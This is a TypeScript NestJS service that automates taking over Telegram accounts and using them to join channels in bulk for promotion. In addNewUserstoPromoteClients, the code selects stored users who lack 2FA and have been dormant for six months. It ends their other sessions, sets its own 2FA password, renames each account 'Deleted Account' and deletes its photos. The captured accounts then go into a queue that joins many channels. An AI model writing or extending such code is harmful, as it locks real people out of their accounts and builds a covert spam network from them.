import { ChannelsService } from '../channels/channels.service';
import { Channel } from '../channels/schemas/channel.schema';
import { BadRequestException, HttpException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';
import { InjectModel } from '@nestjs/mongoose';
import { Model } from 'mongoose';
import { CreatePromoteClientDto } from './dto/create-promote-client.dto';
import { PromoteClient, PromoteClientDocument } from './schemas/promote-client.schema';
import { TelegramService } from '../Telegram/Telegram.service';
import { sleep } from 'telegram/Helpers';
import { UsersService } from '../users/users.service';
import { ActiveChannelsService } from '../active-channels/active-channels.service';
import { parseError } from '../../utils';
import { ClientService } from '../clients/client.service';
import { UpdatePromoteClientDto } from './dto/update-promote-client.dto';
import { BufferClientService } from '../buffer-clients/buffer-client.service';

@Injectable()
export class PromoteClientService {
    private joinChannelMap: Map<string, Channel[]> = new Map();
    private joinChannelIntervalId: NodeJS.Timeout;
    constructor(@InjectModel('promoteClientModule') private promoteClientModel: Model<PromoteClientDocument>,
        @Inject(forwardRef(() => TelegramService))
        private telegramService: TelegramService,
        @Inject(forwardRef(() => UsersService))
        private usersService: UsersService,
        @Inject(forwardRef(() => ActiveChannelsService))
        private activeChannelsService: ActiveChannelsService,
        @Inject(forwardRef(() => ClientService))
        private clientService: ClientService,
        @Inject(forwardRef(() => ActiveChannelsService))
        private channelsService: ChannelsService,
        @Inject(forwardRef(() => BufferClientService))
        private bufferClientService: BufferClientService,
    ) { }

    async create(promoteClient: CreatePromoteClientDto): Promise<PromoteClient> {
        const newUser = new this.promoteClientModel(promoteClient);
        return newUser.save();
    }

    async findAll(): Promise<PromoteClient[]> {
        return this.promoteClientModel.find().exec();
    }

    async findOne(mobile: string): Promise<PromoteClient> {
        const user = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();
        if (!user) {
            throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);
        }
        return user;
    }


    async update(mobile: string, updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {
        const updatedUser = await this.promoteClientModel.findOneAndUpdate(
            { mobile },
            { $set: updateClientDto },
            { new: true, upsert: true, returnDocument: 'after' }
        ).exec();

        if (!updatedUser) {
            throw new NotFoundException(`User with mobile ${mobile} not found`);
        }

        return updatedUser;
    }

    async createOrUpdate(mobile: string, createOrUpdateUserDto: CreatePromoteClientDto | UpdatePromoteClientDto): Promise<PromoteClient> {
        const existingUser = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();
        if (existingUser) {
            console.log("Updating")
            return this.update(existingUser.mobile, createOrUpdateUserDto as UpdatePromoteClientDto);
        } else {
            console.log("creating")
            return this.create(createOrUpdateUserDto as CreatePromoteClientDto);
        }
    }

    async remove(mobile: string): Promise<void> {
        const result = await this.promoteClientModel.deleteOne({ mobile }).exec();
        if (result.deletedCount === 0) {
            throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);
        }
    }
    async search(filter: any): Promise<PromoteClient[]> {
        console.log(filter)
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }
        }
        console.log(filter)
        return this.promoteClientModel.find(filter).exec();
    }

    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<PromoteClient[]> {
        try {

            if (!query) {
                throw new BadRequestException('Query is invalid.');
            }
            const queryExec = this.promoteClientModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }

            if (limit) {
                queryExec.limit(limit);
            }

            if (skip) {
                queryExec.skip(skip);
            }

            return await queryExec.exec();
        } catch (error) {
            throw new InternalServerErrorException(error.message);
        }
    }

    removeFromPromoteMap(key: string) {
        this.joinChannelMap.delete(key)
    }
    clearPromoteMap() {
        console.log("PromoteMap cleared")
        this.joinChannelMap.clear()
    }

    async joinchannelForPromoteClients(): Promise<string> {
        if (!this.telegramService.getActiveClientSetup()) {
            console.log("Joining Channel Started")
            await this.telegramService.disconnectAll();
            await sleep(2000);
            // const today = (new Date(Date.now())).toISOString().split('T')[0];
            const clients = await this.promoteClientModel.find({ channels: { "$lt": 350 } }).sort({ channels: 1 }).limit(4);
            for (const document of clients) {
                try {
                    if (!this.joinChannelMap.has(document.mobile)) {
                        const client = await this.telegramService.createClient(document.mobile, false, false);
                        console.log("Started Joining for : ", document.mobile)
                        const channels = await client.channelInfo(true);
                        console.log("Existing Channels Length : ", channels.ids.length);
                        await this.update(document.mobile, { channels: channels.ids.length });
                        let result = [];
                        if (channels.canSendFalseCount < 50) {
                            if (channels.ids.length < 220) {
                                result = await this.channelsService.getActiveChannels(150, 0, channels.ids);
                            } else {
                                result = await this.activeChannelsService.getActiveChannels(150, 0, channels.ids);
                            }
                            this.joinChannelMap.set(document.mobile, result);
                            await this.telegramService.deleteClient(document.mobile);
                        } else {
                            client.leaveChannels(channels.canSendFalseChats)
                        }
                        // console.log("DbChannelsLen: ", result.length);
                        // let resp = '';
                        // this.telegramService.joinChannels(document.mobile, result);
                    }
                } catch (error) {
                    parseError(error)
                }
            }
            this.joinChannelQueue();
            console.log("Joining Channel Triggered Succesfully for ", clients.length);
            return "Initiated Joining channels"
        } else {
            console.log("ignored active check promote channels as active client setup exists")
        }
    }

    async joinChannelQueue() {
        this.joinChannelIntervalId = setInterval(async () => {
            const keys = Array.from(this.joinChannelMap.keys());
            if (keys.length > 0) {
                console.log("In JOIN CHANNEL interval: ", new Date().toISOString());
                for (const mobile of keys) {
                    const channels = this.joinChannelMap.get(mobile);
                    if (channels && channels.length > 0) {
                        const channel = channels.shift();
                        console.log(mobile, " Pending Channels :", channels.length)
                        this.joinChannelMap.set(mobile, channels);
                        try {
                            await this.telegramService.createClient(mobile, false, false);
                            console.log(mobile, " Trying to join :", channel.username);
                            await this.telegramService.tryJoiningChannel(mobile, channel);
                        } catch (error) {
                            const errorDetails = parseError(error, `${mobile} @${channel.username} Outer Err ERR: `);
                            if (error.errorMessage == 'CHANNELS_TOO_MUCH' || errorDetails.error == 'FloodWaitError') {
                                this.removeFromPromoteMap(mobile)
                                const channels = await this.telegramService.getChannelInfo(mobile, true);
                                await this.update(mobile, { channels: channels.ids.length });
                            }
                        }
                        await this.telegramService.deleteClient(mobile);
                    } else {
                        this.joinChannelMap.delete(mobile);
                    }
                }
            } else {
                this.clearJoinChannelInterval()
            }
        }, 3 * 60 * 1000);
    }

    clearJoinChannelInterval() {
        if (this.joinChannelIntervalId) {
            clearInterval(this.joinChannelIntervalId);
            this.joinChannelIntervalId = null;
        }
    }

    async setAsPromoteClient(
        mobile: string,
        availableDate: string = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]
    ) {
        const user = (await this.usersService.search({ mobile }))[0];
        if (!user) {
            throw new BadRequestException('user not found');
        }
        const clients = await this.clientService.findAll();
        const clientMobiles = clients.map(client => client?.mobile);
        const clientPromoteMobiles = clients.map(client => client?.promoteMobile);
        if (!clientMobiles.includes(mobile) && !clientPromoteMobiles.includes(mobile)) {
            const telegramClient = await this.telegramService.createClient(mobile)
            try {
                await telegramClient.set2fa();
                await sleep(15000)
                await telegramClient.updateUsername('');
                await sleep(3000)
                await telegramClient.updatePrivacyforDeletedAccount();
                await sleep(3000)
                await telegramClient.updateProfile("Deleted Account", "Deleted Account");
                await sleep(3000)
                await telegramClient.deleteProfilePhotos();
                const channels = await this.telegramService.getChannelInfo(mobile, true)
                const promoteClient = {
                    tgId: user.tgId,
                    lastActive: "default",
                    mobile: user.mobile,
                    availableDate,
                    channels: channels.ids.length,
                }
                await this.promoteClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: promoteClient }, { new: true, upsert: true }).exec();
            } catch (error) {
                const errorDetails = parseError(error)
                throw new HttpException(errorDetails.message, parseInt(errorDetails.status))
            }
            await this.telegramService.deleteClient(mobile)
            return "Client set as promote successfully";
        } else {
            throw new BadRequestException("Number is a Active Client")
        }
    }

    async checkPromoteClients() {
        if (!this.telegramService.getActiveClientSetup()) {
            await this.telegramService.disconnectAll()
            await sleep(2000);
            const promoteclients = await this.findAll();
            const goodIds = [];
            const badIds = [];
            if (promoteclients.length < 70) {
                for (let i = 0; i < 70 - promoteclients.length && badIds.length < 4; i++) {
                    badIds.push(1)
                }
            }
            const clients = await this.clientService.findAll();
            const bufferClients = await this.bufferClientService.findAll();
            const clientIds = clients.map(client => client.mobile);
            const bufferClientIds = bufferClients.map(client => client.mobile);

            const today = (new Date(Date.now())).toISOString().split('T')[0];
            for (const document of promoteclients) {
                if (!clientIds.includes(document.mobile) && !bufferClientIds.includes(document.mobile)) {
                    try {
                        const cli = await this.telegramService.createClient(document.mobile, true, false);
                        const me = await cli.getMe();
                        if (me.username) {
                            await this.telegramService.updateUsername(document.mobile, '');
                        }
                        if (me.firstName !== "Deleted Account") {
                            await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account');
                        }
                        const hasPassword = await cli.hasPassword();
                        if (!hasPassword && badIds.length < 4) {
                            console.log("Client does not have password");
                            badIds.push(document.mobile);
                            // await this.remove(document.mobile);
                        } else {
                            const channelinfo = await this.telegramService.getChannelInfo(document.mobile, true);
                            await this.promoteClientModel.findOneAndUpdate({ mobile: document.mobile }, { channels: channelinfo.ids.length })
                            console.log(document.mobile, " :  ALL Good");
                            goodIds.push(document.mobile)
                        }
                        await this.telegramService.deleteClient(document.mobile)
                        await sleep(2000);
                    } catch (error) {
                        parseError(error);
                        badIds.push(document.mobile);
                        this.remove(document.mobile)
                        await this.telegramService.deleteClient(document.mobile)
                    }
                } else {
                    console.log("Number is a Active Client");
                    goodIds.push(document.mobile)
                    this.remove(document.mobile)
                }
            }
            console.log("GoodIds: ", goodIds.length, "BadIds : ", badIds.length);
            this.addNewUserstoPromoteClients(badIds, goodIds);
        } else {
            console.log("ignored active check promote channels as active client setup exists")
        }
    }

    async addNewUserstoPromoteClients(badIds: string[], goodIds: string[]) {
        const sixMonthsAgo = (new Date(Date.now() - 6 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];
        const documents = await this.usersService.executeQuery({ "mobile": { $nin: goodIds }, twoFA: false, lastActive: { $lt: sixMonthsAgo }, totalChats: { $gt: 300 } }, { tgId: 1 }, badIds.length + 3);
        console.log("New promote documents to be added: ", documents.length)
        while (badIds.length > 0 && documents.length > 0) {
            const document = documents.shift();
            try {
                try {
                    const client = await this.telegramService.createClient(document.mobile);
                    const hasPassword = await client.hasPassword();
                    console.log("hasPassword: ", hasPassword);
                    if (!hasPassword) {
                        await client.removeOtherAuths();
                        await client.set2fa();
                        console.log("waiting for setting 2FA");
                        await sleep(30000);
                        await client.updateUsername('');
                        await sleep(3000)
                        await client.updatePrivacyforDeletedAccount();
                        await sleep(3000)
                        await client.updateProfile("Deleted Account", "Deleted Account");
                        await sleep(3000)
                        await client.deleteProfilePhotos();
                        const channels = await client.channelInfo(true)
                        console.log("Inserting Document");
                        const promoteClient = {
                            tgId: document.tgId,
                            lastActive: "today",
                            mobile: document.mobile,
                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],
                            channels: channels.ids.length,
                        }
                        await this.create(promoteClient);
                        console.log("=============Created PromoteClient=============")
                        await this.telegramService.deleteClient(document.mobile)
                        badIds.pop();
                    } else {
                        console.log("Failed to Update as PromoteClient has Password");
                        await this.usersService.update(document.tgId, { twoFA: true })
                        await this.telegramService.deleteClient(document.mobile)
                    }
                } catch (error) {
                    parseError(error)
                    await this.telegramService.deleteClient(document.mobile)
                }
            } catch (error) {
                parseError(error)
                console.error("An error occurred:", error);
            }
            await this.telegramService.deleteClient(document.mobile)
        }
        setTimeout(() => {
            this.joinchannelForPromoteClients()
        }, 2 * 60 * 1000);
    }
}
